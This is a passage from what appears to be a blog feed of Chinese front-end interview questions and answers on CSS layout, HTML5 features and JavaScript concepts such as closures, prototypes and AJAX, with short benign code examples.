h6&#123; font-size:100%; &#125;address, cite, dfn, em, var &#123; font-style:normal; &#125;code, kbd, pre, samp &#123; font-family:couriernew, courier, monospace; &#125;small&#123; font-size:12px; &#125;ul, ol &#123; list-style:none; &#125;a &#123; text-decoration:none; &#125;a:hover &#123; text-decoration:underline; &#125;sup &#123; vertical-align:text-top; &#125;sub&#123; vertical-align:text-bottom; &#125;legend &#123; color:#000; &#125;fieldset, img &#123; border:0; &#125;button, input, select, textarea &#123; font-size:100%; &#125;table &#123; border-collapse:collapse; border-spacing:0; &#125; absolute的containing block(容器块)计算方式跟正常流有什么不同？无论属于哪种，都要先找到其祖先元素中最近的 position 值不为 static 的元素，然后再判断： 1、若此元素为 inline 元素，则 containing block 为能够包含这个元素生成的第一个和最后一个 inline box 的 padding box (除 margin, border 外的区域) 的最小矩形； 2、否则,则由这个祖先元素的 padding box 构成。 如果都找不到，则为 initial containing block。 补充： static(默认的)/relative：简单说就是它的父元素的内容框（即去掉padding的部分） absolute: 向上找最近的定位为absolute/relative的元素 fixed: 它的containing block一律为根元素(html/body)，根元素也是initial containing block CSS里的visibility属性有个collapse属性值是干嘛用的？在不同浏览器下以后什么区别？对于普通元素visibility:collapse;会将元素完全隐藏,不占据页面布局空间,与display:none;表现相同. 如果目标元素为table,visibility:collapse;将table隐藏,但是会占据页面布局空间. 仅在Firefox下起作用,IE会显示元素,Chrome会将元素隐藏,但是占据空间. position跟display、margin collapse、overflow、float这些特性相互叠加后会怎么样？如果元素的display为none,那么元素不被渲染,position,float不起作用,如果元素拥有position:absolute;或者position:fixed;属性那么元素将为绝对定位,float不起作用.如果元素float属性不是none,元素会脱离文档流,根据float属性值来显示.有浮动,绝对定位,inline-block属性的元素,margin不会和垂直方向上的其他元素margin折叠. 对BFC规范(块级格式化上下文：block formatting context)的理解？（W3C CSS 2.1 规范中的一个概念,它是一个独立容器，决定了元素如何对其内容进行定位,以及与其他元素的关系和相互作用。）一个页面是由很多个 Box 组成的,元素的类型和 display 属性,决定了这个 Box 的类型。不同类型的 Box,会参与不同的 Formatting Context（决定如何渲染文档的容器）,因此Box内的元素会以不同的方式渲染,也就是说BFC内部的元素和外部的元素不会互相影响。 css定义的权重1234567891011121314151617181920以下是权重的规则：标签的权重为1，class的权重为10，id的权重为100，以下例子是演示各种定义的权重值：/*权重为1*/div&#123;&#125;/*权重为10*/.class1&#123;&#125;/*权重为100*/#id1&#123;&#125;/*权重为100+1=101*/#id1 div&#123;&#125;/*权重为10+1=11*/.class1 div&#123;&#125;/*权重为10+10+1=21*/.class1 .class2 div&#123;&#125;如果权重相同，则最后定义的样式会起作用，但是应该避免这种情况出现 什么是外边距合并？外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。w3school介绍网址： http://www.w3school.com.cn/css/css_margin_collapsing.asp 移动端的布局用过媒体查询吗？假设你现在正用一台显示设备来阅读这篇文章，同时你也想把它投影到屏幕上，或者打印出来， 而显示设备、屏幕投影和打印等这些媒介都有自己的特点，CSS就是为文档提供在不同媒介上展示的适配方法 当媒体查询为真时，相关的样式表或样式规则会按照正常的级联规被应用。 当媒体查询返回假， 标签上带有媒体查询的样式表 仍将被下载 （只不过不会被应用）。 包含了一个媒体类型和至少一个使用 宽度、高度和颜色等媒体属性来限制样式表范围的表达式。 CSS3加入的媒体查询使得无需修改内容便可以使样式应用于某些特定的设备范围。 1&lt;style&gt; @media (min-width: 700px) and (orientation: landscape)&#123; .sidebar &#123; display: none; &#125; &#125; &lt;/style&gt; 使用 CSS 预处理器吗？喜欢那个？SASS (SASS、LESS没有本质区别，只因为团队前端都是用的SASS) CSS优化、提高性能的方法有哪些？关键选择器（key selector）。选择器的最后面的部分为关键选择器（即用来匹配目标元素的部分）；如果规则拥有 ID 选择器作为其关键选择器，则不要为规则增加标签。过滤掉无关的规则（这样样式系统就不会浪费时间去匹配它们了）；提取项目的通用公有样式，增强可复用性，按模块编写组件；增强项目的协同开发性、可维护性和可扩展性;使用预处理工具或构建工具（gulp对css进行语法检查、自动补前缀、打包压缩、自动优雅降级）； 浏览器是怎样解析CSS选择器的？样式系统从关键选择器开始匹配，然后左移查找规则选择器的祖先元素。只要选择器的子树一直在工作，样式系统就会持续左移，直到和规则匹配，或者是因为不匹配而放弃该规则。 margin和padding分别适合什么场景使用？margin是用来隔开元素与元素的间距；padding是用来隔开元素与内容的间隔。margin用于布局分开元素使元素与元素互不相干；padding用于元素与内容之间的间隔，让内容（文字）与（包裹）元素之间有一段 ::before 和 :after中双冒号和单冒号 有什么区别？解释一下这2个伪元素的作用。单冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。（伪元素由双冒号和伪元素名称组成）双冒号是在当前规范中引入的，用于区分伪类和伪元素。不过浏览器需要同时支持旧的已经存在的伪元素写法，比如:first-line、:first-letter、:before、:after等，而新的在CSS3中引入的伪元素则不允许再支持旧的单冒号的写法。想让插入的内容出现在其它内容前，使用::before，否者，使用::after；在代码顺序上，::after生成的内容也比::before生成的内容靠后。如果按堆栈视角，::after生成的内容会在::before生成的内容之上 如何修改chrome记住密码后自动填充表单的黄色背景 ？12345input:-webkit-autofill, textarea:-webkit-autofill, select:-webkit-autofill &#123; background-color: rgb(250, 255, 189); /* #FAFFBD; */ background-image: none; color: rgb(0, 0, 0);&#125; 设置元素浮动后，该元素的display值是多少？自动变成了 display:block 怎么让Chrome支持小于12px 的文字？ 1、用图片：如果是内容固定不变情况下，使用将小于12px文字内容切出做图片，这样不影响兼容也不影响美观。 2、使用12px及12px以上字体大小：为了兼容各大主流浏览器，建议设计美工图时候设置大于或等于12px的字体大小，如果是接单的这个时候就需要给客户讲解小于12px浏览器不兼容等事宜。 3、继续使用小于12px字体大小样式设置：如果不考虑chrome可以不用考虑兼容，同时在设置小于12px对象设置-webkit-text-size-adjust:none，做到最大兼容考虑。 4、使用12px以上字体：为了兼容、为了代码更简单 从新考虑权重下兼容性。 让页面里的字体变清晰，变细用CSS怎么做？-webkit-font-smoothing: antialiased; position:fixed;在android下无效怎么处理？fixed的元素是相对整个页面固定位置的，你在屏幕上滑动只是在移动这个所谓的viewport，原来的网页还好好的在那，fixed的内容也没有变过位置，所以说并不是iOS不支持fixed，只是fixed的元素不是相对手机屏幕固定的。 1&lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"/&gt; 如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms display:inline-block 什么时候会显示间隙？(携程)移除空格、使用margin负值、使用font-size:0、letter-spacing、word-spacing 什么是Cookie 隔离？（或者说：请求资源的时候不要让它带cookie怎么做）如果静态文件都放在主域名下，那静态文件请求的时候都带有的cookie的数据提交给server的，非常浪费流量，所以不如隔离开。 因为cookie有域的限制，因此不能跨域提交请求，故使用非主要域名的时候，请求头中就不会带有cookie数据，这样可以降低请求头的大小，降低请求时间，从而达到降低整体请求延时的目的。 同时这种方式不会将cookie传入Web Server，也减少了Web Server对cookie的处理分析环节，提高了webserver的http请求的解析速度。 什么是CSS 预处理器 / 后处理器？ 预处理器例如：LESS、Sass、Stylus，用来预编译Sass或less，增强了css代码的复用性，还有层级、mixin、变量、循环、函数等，具有很方便的UI组件模块化开发能力，极大的提高工作效率。 后处理器例如：PostCSS，通常被视为在完成的样式表中根据CSS规范处理CSS，让其更有效；目前最常做的是给CSS属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>CSS专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-HTML专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-HTML%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[常用哪几种浏览器测试？有哪些内核(Layout Engine)? 浏览器：IE,Chrome,FireFox,Safari,Opera 内核：Trident,Gecko,Presto,Webkit。 详细介绍 Trident内核代表产品Internet Explorer，又称其为IE内核。Trident（又称为MSHTML），是微软开发的一种排版引擎。使用Trident渲染引擎的浏览器包括：IE、傲游、世界之窗浏览器、Avant、腾讯TT、Netscape 8、NetCaptor、Sleipnir、GOSURF、GreenBrowser和KKman等。 Gecko内核代表作品Mozilla FirefoxGecko是一套开放源代码的、以C++编写的网页排版引擎。Gecko是最流行的排版引擎之一，仅次于Trident。使用它的最著名浏览器有Firefox、Netscape6至9。 WebKit内核代表作品Safari、Chromewebkit 是一个开源项目，包含了来自KDE项目和苹果公司的一些组件，主要用于Mac OS系统，它的特点在于源码结构清晰、渲染速度极快。缺点是对网页代码的兼容性不高，导致一些编写不标准的网页无法正常显示。主要代表作品有Safari和Google的浏览器Chrome。 Presto内核代表作品OperaPresto是由Opera Software开发的浏览器排版引擎，供Opera 7.0及以上使用。它取代了旧版Opera 4至6版本使用的Elektra排版引擎，包括加入动态功能，例如网页或其部分可随着DOM及Script语法的事件而重新排版。 说下行内元素和块级元素的区别？行内块元素的兼容性使用？(IE8 以下) 行内元素：会在水平方向排列，不能包含块级元素，设置width无效，height无效(可以设置line-height)，margin上下无效，左右有效，padding上下左右都有效。 块级元素：各占据一行，垂直方向排列。 兼容性： display:inline-block display:inline; zoom:1;说说对zoom：1的理解？zoom:1;属性是IE浏览器的专有属性，Firefox等其它浏览器不支持。它可以设置或检索对象的缩放比例。除此之外，它还有其他一些小作用，比如触发ie的hasLayout属性，清除浮动、清除margin的重叠等。但很遗憾的是，它通不过W3C验证．说说对IE的haslayout的理解？haslayout是Windows Internet Explorer渲染引擎的一个内部组成部分。在Internet Explorer中，使用布局概念来控制元素的尺寸和定位。在理想情况下，所有元素都控制自己的尺寸和定位。但是，这在IE中会导致很大的性能问题。因此，IE开发团队决定只将布局应用于实际需要它的那些元素，这样就可以充分地减少性能开销。具体什么是haslayout请看这篇文章 ： http://www.cnblogs.com/yuqingfamily/p/6866285.html Doctype作用？标准模式与兼容模式各有什么区别? &lt;!DOCTYPE&gt;告知浏览器的解析器用什么文档标准解析这个文档。DOCTYPE不存在或格式不正确会导致文档以兼容模式呈现。 标准模式的排版和JS运作模式都是以该浏览器支持的最高标准运行。在兼容模式中，页面以宽松的向后兼容的方式显示,模拟老式浏览器的行为以防止站点无法工作。HTML5 为什么只需要写 &lt;!DOCTYPE HTML&gt;？ HTML5不基于 SGML，因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为（让浏览器按照它们应该的方式来运行）。 而HTML4.01基于SGML,所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？首先：CSS规范规定，每个元素都有display属性，确定该元素的类型，每个元素都有默认的display值，如div的display默认值为“block”，则为“块级”元素；span默认display属性值为“inline”，是“行内”元素。 （1）行内元素有：a b span img input select strong（强调的语气） （2）块级元素有：div ul ol li dl dt dd h1 h2 h3 h4…p （3）常见的空元素： 鲜为人知的是： 不同浏览器（版本）、HTML4（5）、CSS2等实际略有差异参考: http://stackoverflow.com/questions/6867254/browsers-default-css-for-html-elements html5有哪些新特性？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？ 新特性：HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。 (1)绘画 canvas; (2)用于媒介回放的 video 和 audio 元素; (3)本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失; (4)sessionStorage 的数据在浏览器关闭后自动删除; (5)语意化更好的内容元素，比如 article、footer、header、nav、section; (6)表单控件，calendar、date、time、email、url、search; (7)新的技术webworker, websocket, Geolocation; 如何处理浏览器兼容问题？ IE8/IE7/IE6支持通过document.createElement方法产生的标签，可以利用这一特性让这些浏览器支持HTML5新标签，浏览器支持新标签后，还需要添加标签默认的样式。当然也可以直接使用成熟的框架、比如html5shim;&lt;!–[if lt IE 9]&gt; src=”http://html5shim.googlecode.com/svn/trunk/html5.js&quot;&lt;![endif]–&gt; 如何区分 HTML 和 HTML5？ 文档声明，语意结构，H5新标签的使用 简述一下你对HTML语义化的理解？ 用正确的标签做正确的事情。 html语义化让页面的内容结构化，结构更清晰，便于对浏览器、搜索引擎解析; 即使在没有样式CSS情况下也以一种文档格式显示，并且是容易阅读的; 搜索引擎的爬虫也依赖于HTML标记来确定上下文和各个关键字的权重，利于SEO; 使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解。 HTML5的离线储存怎么使用，工作原理能不能解释一下？在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。 原理：HTML5的离线存储是基于一个新建的.appcache文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示。 如何使用： 1、页面头部像下面一样加入一个manifest的属性； 2、在cache.manifest文件的编写离线存储的资源； CACHE MANIFEST #v0.11 CACHE: js/app.js css/style.css NETWORK: resourse/logo.png FALLBACK: / /offline.html 3、在离线状态时，操作window.applicationCache进行需求实现。 浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢？在线的情况下，浏览器发现html头部有manifest属性，它会请求manifest文件，如果是第一次访问app，那么浏览器就会根据manifest文件的内容下载相应的资源并且进行离线存储。如果已经访问过app并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的manifest文件与旧的manifest文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。离线的情况下，浏览器就直接使用离线存储的资源。 请描述一下 cookies，sessionStorage 和 localStorage 的区别？ cookie是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。 cookie数据始终在同源的http请求中携带（即使不需要），也会在浏览器和服务器间来回传递。 sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。 存储大小： cookie数据大小不能超过4k。 sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。 有期时间： localStorage 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据； sessionStorage 数据在当前浏览器窗口关闭后自动删除。 cookie 设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭 iframe有那些缺点？ iframe会阻塞主页面的Onload事件； 搜索引擎的检索程序无法解读这种页面，不利于SEO; iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。 使用iframe之前需要考虑这两个缺点。如果需要使用iframe，最好是通过javascript动态给iframe添加src属性值，这样可以绕开以上两个问题。 如何实现浏览器内多个标签页之间的通信?(阿里)WebSocket、SharedWorker也可以调用localstorge、cookies等本地存储方式。localstorge另一个浏览上下文里被添加、修改或删除时，它都会触发一个事件，我们通过监听事件，控制它的值来进行页面信息通信。 注意quirks：Safari 在无痕模式下设置localstorge值时会抛出 QuotaExceededError 的异常。 如何在页面上实现一个圆形的可点击区域？-（1）map+area或者svg-（2）border-radius-（3）纯js实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等 Label的作用是什么？是怎么用的？label标签来定义表单控制间的关系,当用户选择该标签时，浏览器会自动将焦点转到和标签相关的表单控件上。 123&lt;label for="Name"&gt;Number:&lt;/label&gt;&lt;input type=“text“name="Name" id="Name"/&gt;&lt;label&gt;Date:&lt;input type="text" name="B"/&gt;&lt;/label&gt; HTML5的form如何关闭自动完成功能？给不想要提示的 form 或某个 input 设置为 autocomplete=off。 webSocket如何兼容低浏览器？(阿里) Adobe Flash Socket 、 ActiveX HTMLFile (IE) 、 基于 multipart 编码发送 XHR 、 基于长轮询的 XHR 页面可见性（Page Visibility API） 可以有哪些用途？通过 visibilityState 的值检测页面当前是否可见，以及打开网页的时间等;在页面被切换到其他后台进程的时候，自动暂停音乐或视频的播放； 如何在页面上实现一个圆形的可点击区域？ 1、map+area或者svg 2、border-radius 3、纯js实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等 实现不使用 border 画出1px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果。1&lt;div style="height:1px;overflow:hidden;background:red"&gt;&lt;/div&gt; 网页验证码是干嘛的，是为了解决什么安全问题。区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水；有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试。 title与h1的区别、b与strong的区别、i与em的区别？title属性没有明确意义只表示是个标题，H1则表示层次明确的标题，对页面信息的抓取也有很大的影响；strong是标明重点内容，有语气加强的含义，使用阅读设备阅读网络时：会重读，而是展示强调内容。i内容展示为斜体，em表示强调的文本；Physical Style Elements – 自然样式标签b, i, u, s, preSemantic Style Elements – 语义样式标签strong, em, ins, del, code应该准确使用语义样式标签, 但不能滥用, 如果不能确定时首选使用自然样式标签。 ##]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>HTML专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-JavaScript专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-JavaScript%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[介绍js的基本数据类型undefined、null、boolean、number、string js有哪些内置对象？ 数据封装类对象：Object、Array、Boolean、Number 和 String 其他对象：Function、Arguments、Math、Date、RegExp、Error this对象的理解 this总是指向函数的直接调用者（而非间接调用者）； 如果有new关键字，this指向new出来的那个对象； 在事件中，this指向触发这个事件的对象，特殊的是，IE中的attachEvent中的this总是指向全局对象Window； eval是做什么的？它的功能是把对应的字符串解析成JS代码并运行；应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）。由JSON字符串转换为JSON对象的时候可以用eval，var obj =eval(‘(‘+ str +’)’);DOM怎样添加、移除、移动、复制、创建和查找节点 12345678910111213// 创建新节点createDocumentFragment() //创建一个DOM片段createElement() //创建一个具体的元素createTextNode() //创建一个文本节点// 添加、移除、替换、插入appendChild()removeChild()replaceChild()insertBefore() //在已有的子节点前插入一个新的子节点// 查找getElementsByTagName() //通过标签名称getElementsByName() //通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的)getElementById() //通过元素Id，唯一性 null和undefined的区别？ null 表示一个对象是“没有值”的值，也就是值为“空”； undefined 表示一个变量声明了没有初始化(赋值)； undefined不是一个有效的JSON，而null是； undefined的类型(typeof)是undefined； null的类型(typeof)是object； Javascript将未赋值的变量默认值设为undefined；Javascript从来不会将变量设为null。它是用来让程序员表明某个用var声明的变量时没有值的。 typeof undefined //“undefined” undefined :是一个表示”无”的原始值或者说表示”缺少值”，就是此处应该有一个值，但是还没有定义。当尝试读取时会返回 undefined； 例如变量被声明了，但没有赋值时，就等于undefined typeof null //“object” null : 是一个对象(空对象, 没有任何属性和方法)； 例如作为函数的参数，表示该函数的参数不是对象； 注意： 在验证null时，一定要使用 === ，因为 == 无法分别 null 和 undefined null == undefined // true null === undefined // false null是一个表示”无”的对象，转为数值时为0；undefined是一个表示”无”的原始值，转为数值时为NaN。 undefined： （1）变量被声明了，但没有赋值时，就等于undefined。 （2) 调用函数时，应该提供的参数没有提供，该参数等于undefined。 （3）对象没有赋值的属性，该属性的值为undefined。 （4）函数没有返回值时，默认返回undefined。 null： （1） 作为函数的参数，表示该函数的参数不是对象。 （2） 作为对象原型链的终点。 具体差别可查看这篇文章：http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html new操作符具体干了什么呢?-（1）创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。-（2）属性和方法被加入到 this 引用的对象中。-（3）新创建的对象由 this 所引用，并且最后隐式的返回 this 。 JSON 的了解？JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小。格式：采用键值对，例如：{‘age’:’12’, ‘name’:’back’} call() 和 apply() 的区别和作用？apply()函数有两个参数：第一个参数是上下文，第二个参数是参数组成的数组。如果上下文是null，则使用全局对象代替。如：function.apply(this,[1,2,3]);call()的第一个参数是上下文，后续是实例传入的参数序列。如：function.call(this,1,2,3); 如何获取UA（用户代理）？123456function whatBrowser() &#123; document.Browser.Name.value=navigator.appName; document.Browser.Version.value=navigator.appVersion; document.Browser.Code.value=navigator.appCodeName; document.Browser.Agent.value=navigator.userAgent; &#125; navigator.userAgent 获取浏览器UA 说几条写JavaScript的基本规范？ 1.不要在同一行声明多个变量。 2.请使用 ===/!==来比较true/false或者数值 3.使用对象字面量替代new Array这种形式 4.不要使用全局函数。 5.Switch语句必须带有default分支 6.函数不应该有时候有返回值，有时候没有返回值。 7.For循环必须使用大括号 8.If语句必须使用大括号 9.for-in循环中的变量 应该使用var关键字明确限定作用域，从而避免作用域污染。 JavaScript原型，原型链 ? 有什么特点？ （1）原型对象也是普通的对象，是对象一个自带隐式的 proto 属性，原型也有可能有自己的原型，如果一个原型对象的原型不为null的话，我们就称之为原型链。 （2）原型链是由一些用来继承和共享属性的对象组成的（有限的）对象链。 每个对象都会在其内部初始化一个属性，就是prototype(原型)，当我们访问一个对象的属性时，如果这个对象内部不存在这个属性，那么他就会去prototype里找这个属性，这个prototype又会有自己的prototype，于是就这样一直找下去，也就是我们平时所说的原型链的概念。关系：instance.constructor.prototype = instance.proto 特点：JavaScript对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变。 当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的话，就会查找他的Prototype对象是否有这个属性，如此递推下去，一直检索到 Object 内建对象。 12345678910function Func()&#123;&#125; Func.prototype.name = "Sean"; Func.prototype.getInfo = function() &#123; return this.name;&#125;var person = new Func();//现在可以参考var person = Object.create(oldObject);console.log(person.getInfo());//它拥有了Func的属性和方法//"Sean"console.log(Func.prototype);// Func &#123; name="Sean", getInfo=function()&#125; JavaScript有几种类型的值？，你能画一下他们的内存图吗？ 栈：原始数据类型（Undefined，Null，Boolean，Number、String） 堆：引用数据类型（对象、数组和函数） 两种类型的区别是：存储位置不同； 原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储； 引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定。如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体 Flash、Ajax各自的优缺点，在使用中如何取舍？Flash适合处理多媒体、矢量图形、访问机器；对CSS、处理文本上不足，不容易被搜索。Ajax对CSS、文本支持很好，支持搜索；多媒体、矢量图形、机器访问不足。共同点：与服务器的无刷新传递消息、用户离线和在线状态、操作DOM 什么是闭包？为什么要用它？闭包的理解闭包，官方对闭包的解释是：一个拥有许多变量和绑定了这些变量的环境的表达式（通常是一个函数），因而这些变量也是该表达式的一部分。 闭包的特点： （1）作为一个函数变量的一个引用，当函数返回时，其处于激活状态。 （2） 一个闭包就是当一个函数返回时，一个没有释放资源的栈区。 闭包的特性： 1.函数内再嵌套函数 2.内部函数可以引用外层的参数和变量 3.参数和变量不会被垃圾回收机制回收 简单的说，Javascript允许使用内部函数—即函数定义和函数表达式位于另一个函数的函数体内。而且，这些内部函数可以访问它们所在的外部函数中声明的所有局部变量、参数和声明的其他内部函数。当其中一个这样的内部函数在包含它们的外部函数之外被调用时，就会形成闭包。 为什么要用闭包？1234567891011121314151617//li节点的onclick事件都能正确的弹出当前被点击的li索引 &lt;ul id="testUL"&gt; &lt;li&gt; index = 0&lt;/li&gt; &lt;li&gt; index = 1&lt;/li&gt; &lt;li&gt; index = 2&lt;/li&gt; &lt;li&gt; index = 3&lt;/li&gt; &lt;/ul&gt; &lt;script type="text/javascript"&gt; var nodes = document.getElementsByTagName("li"); for(i = 0;i&lt;nodes.length;i+= 1)&#123; nodes[i].onclick = (function(i)&#123; return function() &#123; console.log(i); &#125; //不用闭包的话，值每次都是4 &#125;)(i); &#125; &lt;/script&gt; 执行say667()后,say667()闭包内部变量会存在,而闭包内部函数的内部变量不会存在使得Javascript的垃圾回收机制GC不会收回say667()所占用的资源因为say667()的内部函数的执行需要依赖say667()中的变量这是对闭包作用的非常直白的描述 123456789101112function say667() &#123; // Local variable that ends up within closure var num = 666; var sayAlert = function() &#123; alert(num); &#125; num++; return sayAlert; &#125;var sayAlert = say667();sayAlert()//执行结果应该弹出的667 javascript 代码中的”use strict”;是什么意思 ? 使用它区别是什么？ use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行, 使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为。 默认支持的糟糕特性都会被禁用，比如不能用with，也不能在意外的情况下给全局变量赋值; 全局变量的显示声明,函数必须声明在顶层，不允许在非函数代码块内声明函数,arguments.callee也不允许使用； 消除代码运行的一些不安全之处，保证代码运行的安全,限制函数中的arguments修改，严格模式下的eval函数的行为和非严格模式的也不相同; 提高编译器效率，增加运行速度； 为未来新版本的Javascript标准化做铺垫。 Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？hasOwnProperty javaScript中hasOwnProperty函数方法是返回一个布尔值，指出一个对象是否具有指定名称的属性。此方法无法检查该对象的原型链中是否具有该属性；该属性必须是对象本身的一个成员。 使用方法：object.hasOwnProperty(proName)其中参数object是必选项。一个对象的实例。proName是必选项。一个属性名称的字符串值。 如果 object 具有指定名称的属性，那么JavaScript中hasOwnProperty函数方法返回 true，反之则返回 false。 js延迟加载的方式有哪些？defer和async、动态创建DOM方式（用得最多）、按需异步载入js javascript里面的继承怎么实现，如何避免原型链上面的对象共享用构造函数和原型链的混合模式去实现继承，避免对象共享可以参考经典的extend()函数，很多前端框架都有封装的，就是用一个空函数当做中间变量 ajax过程 (1)创建XMLHttpRequest对象,也就是创建一个异步调用对象. (2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. (3)设置响应HTTP请求状态变化的函数. (4)发送HTTP请求. (5)获取异步调用返回的数据. (6)使用JavaScript和DOM实现局部刷新. Ajax 解决浏览器缓存问题？ 1、在ajax发送请求前加上 anyAjaxObj.setRequestHeader(“If-Modified-Since”,”0”)。 2、在ajax发送请求前加上 anyAjaxObj.setRequestHeader(“Cache-Control”,”no-cache”)。 3、在URL后面加上一个随机数： “fresh=” + Math.random();。 在URL后面加上时间戳：”nowtime=” + new Date().getTime();。 如果是使用jQuery，直接这样就可以了 $.ajaxSetup({cache:false})。这样页面的所有ajax都会执行这条语句就是不需要保存缓存记录。 同步和异步的区别？同步的概念应该是来自于OS中关于同步的概念:不同进程为协同完成某项工作而在先后次序上调整(通过阻塞,唤醒等方式).同步强调的是顺序性.谁先谁后.异步则不存在这种顺序性. 同步：浏览器访问服务器请求，用户看得到页面刷新，重新发请求,等请求完，页面刷新，新内容出现，用户看到新内容,进行下一步操作。 异步：浏览器访问服务器请求，用户正常操作，浏览器后端进行请求。等请求完，页面不刷新，新内容也会出现，用户看到新内容。 AMD和CMD的区别？ AMD 是 RequireJS 在推广过程中对模块定义的规范化产出。 CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。 类似的还有 CommonJS Modules/2.0 规范，是 BravoJS 在推广过程中对模块定义的规范化产出。 这些规范的目的都是为了 JavaScript 的模块化开发，特别是在浏览器端的。目前这些规范的实现都能达成浏览器端模块化开发的目的。 区别： 对于依赖的模块，AMD 是提前执行，CMD 是延迟执行。不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。CMD 推崇 as lazy as possible. CMD 推崇依赖就近，AMD 推崇依赖前置。 123456789101112131415// CMDdefine(function(require, exports, module) &#123; var a = require('./a') a.doSomething() // 此处略去 100 行 var b = require('./b') // 依赖可以就近书写 b.doSomething() // ... &#125;)// AMD 默认推荐的是define(['./a', './b'], function(a, b) &#123; // 依赖必须一开始就写好 a.doSomething()// 此处略去 100 行 b.doSomething()&#125;) ajax不可避免的问题都有什么？如何解决呢？ （Q1）ajax以何种数据格式交换数据和跨域的问题如何解决 （Q2）这两大问题，都有不同的解决方案，但是最被推崇的就是用JSON来传数据，靠JSONP来跨域 你有哪些性能优化的方法？ （1） 减少http请求次数：CSS Sprites, JS、CSS源码压缩、图片大小控制合适；网页Gzip，CDN托管，data缓存 ，图片服务器。 （2） 前端模板 JS+数据，减少由于HTML标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数 （3） 用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能。 （4） 当需要设置的样式很多时设置className而不是直接操作style。 （5） 少用全局变量、缓存DOM节点查找的结果。减少IO读取操作。 （6） 避免使用CSS Expression（css表达式)又称Dynamic properties(动态属性)。 （7） 图片预加载，将样式表放在顶部，将脚本放在底部 加上时间戳。什么叫优雅降级和渐进增强？优雅降级：Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。由于IE独特的盒模型布局问题，针对不同版本的IE的hack实践过优雅降级了,为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效. 渐进增强：从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。 哪些常见操作会造成内存泄漏？内存泄漏：指任何对象在您不再拥有或需要它之后仍然存在。 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 